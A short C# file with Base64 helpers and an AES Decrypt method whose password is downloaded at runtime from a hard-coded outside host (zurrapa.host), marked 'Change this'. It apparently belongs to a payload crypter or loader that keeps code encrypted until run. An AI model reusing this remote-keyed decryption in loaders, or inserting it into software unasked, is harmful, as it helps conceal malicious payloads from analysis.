using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Net;
using SecuritySpace;

namespace Encode
{
    class Crypt
    {
        private static bool hayError;
        /// <summary>
        /// Decode a passed string
        /// </summary>
        /// <param name="encodedData"></param>
        /// <returns></returns>
        public static string Decode(string encodedData)
        {
            do
            {
                hayError = false;
                try
                {
                    return Encoding.UTF8.GetString(Convert.FromBase64String(encodedData));
                }
                catch (Exception)
                {
                    encodedData += "=";
                    hayError = true;
                }
            } while (hayError);

            return null;
        }

        public static string Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            string result = System.Convert.ToBase64String(plainTextBytes);
            if (result.Contains("="))
            {
                result = result.Substring(0, result.IndexOf("="));
            }
            return result;
        }

        public static byte[] Decrypt(byte[] input)
        {
            PasswordDeriveBytes pdb =
          new PasswordDeriveBytes(new WebClient().DownloadString("http://zurrapa.host/bm9LYXBwYQ"), // Change this
          new byte[] { 0x13, 0x37, 0x42, 0x0 }); // Change this
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms,
              aes.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(input, 0, input.Length);
            cs.Close();
            return ms.ToArray();
        }
    }
}
